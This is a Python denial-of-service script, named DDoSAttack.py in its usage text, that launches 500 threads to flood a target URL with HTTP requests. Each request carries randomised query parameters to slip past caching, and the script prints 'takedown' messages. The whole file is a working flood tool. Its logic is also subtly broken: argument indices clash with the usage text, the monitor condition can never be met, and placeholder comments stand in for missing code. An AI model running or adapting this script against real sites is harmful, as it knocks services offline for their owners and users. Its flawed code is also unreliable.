import threading
import time
import random
import re
import sys
from urllib.request import urlopen
from urllib.error import HTTPError

# Global params
url = ""
host = ""
port = 80  # Default port
headers_user_agents = []
headers_referers = []
request_counter = 0
flag = 0
kill = 0
takedown = 0  # Variable to indicate a website takedown
is_ddos = 1  # Variable to indicate a DDoS attack
attack_duration = 1  # Set the attack duration in hours
pause_duration = 2  # Set the pause duration in hours
response_delay = 5  # Set the response delay in seconds
lock_object = threading.Lock()  # Used for thread synchronization


def inc_counter():
    global request_counter
    with lock_object:
        request_counter += 1


def set_flag(val):
    global flag
    with lock_object:
        flag = val


def set_takedown():
    global takedown
    with lock_object:
        takedown = 1


# Generates a user agent list
def user_agent_list():
    headers_user_agents.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    # ... (remaining user agents)


# Generates a referer list
def referer_list():
    headers_referers.append("http://www.google.com/?q=")
    # ... (remaining referers)


# Builds random ASCII string
def build_block(size):
    out_str = ""
    for _ in range(size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str


def usage():
    print("---------------------------------------------------")
    print("USAGE: python DDoSAttack.py <url> [port] [attack_duration]")
    print("you can add 'kill' after url, to autoshut after dos")
    print("---------------------------------------------------")


# HTTP request
def http_call(url):
    user_agent_list()
    referer_list()
    code = 0
    param_joiner = "&" if "?" in url else "?"
    random_param = build_block(random.randint(3, 10)) + '=' + build_block(random.randint(3, 10))
    full_url = url + param_joiner + random_param

    try:
        request = urlopen(full_url)
        inc_counter()
        code = request.getcode()
    except HTTPError as ex:
        set_flag(1)
        print(f"Response Code {ex.code}")
        code = ex.code

    return code


# HTTP caller thread - High Power
class HTTPThread(threading.Thread):
    def run(self):
        try:
            start_time = time.time()  # Record the start time
            # Extend the attack duration using a factor
            duration_factor = 9999
            while flag < 2 and (time.time() - start_time) < (attack_duration * duration_factor):
                code = http_call(url)
                if code == 500 and kill == 1:
                    set_flag(2)
            print("\n-- High Power Attack has been broadcasted to all devices... --")  # Change this line

            if takedown == 1:
                print("\n-- Website Takedown in Progress --")
                # Add code for website takedown
            elif is_ddos == 1:
                print("\n-- System Temporarily Down due to DDoS Attack --")
            else:
                print("\n-- Normal Operation --")
            time.sleep(pause_duration * 3600)  # Pause for the specified duration
        except Exception as ex:
            print(ex)


# Monitors HTTP threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter < previous:
                print(f"{request_counter} Requests Sent")
                previous = request_counter
        if flag == 2:
            print("\n-- DDoS Attack Finished --")


# Execute
if len(sys.argv) < 2:
    usage()
    sys.exit(0)
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit(0)
    else:
        print("-- DDoS Attack Started --")
        if len(sys.argv) >= 4:
            port = int(sys.argv[3])
        if len(sys.argv) >= 5:
            attack_duration = float(sys.argv[4])
        if len(sys.argv) >= 6:
            if sys.argv[5] == "kill":
                set_takedown()  # Set takedown flag
        url = sys.argv[1]
        print(f"Target URL: {url}, Port: {port}, Attack Duration: {attack_duration} hours")  # Add this line for debugging
        if "/" in url:
            url = url + "/"
        pattern = r"http://([^/:]*)[:/]?.*"
        match = re.match(pattern, url)
        if match:
            host = match.group(1)
        else:
            print("Error: Unable to extract host from URL.")
            sys.exit(0)
        for _ in range(500):
            t = HTTPThread()
            t.start()
        monitor_thread = MonitorThread()
        monitor_thread.start()

        # Keep the application running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
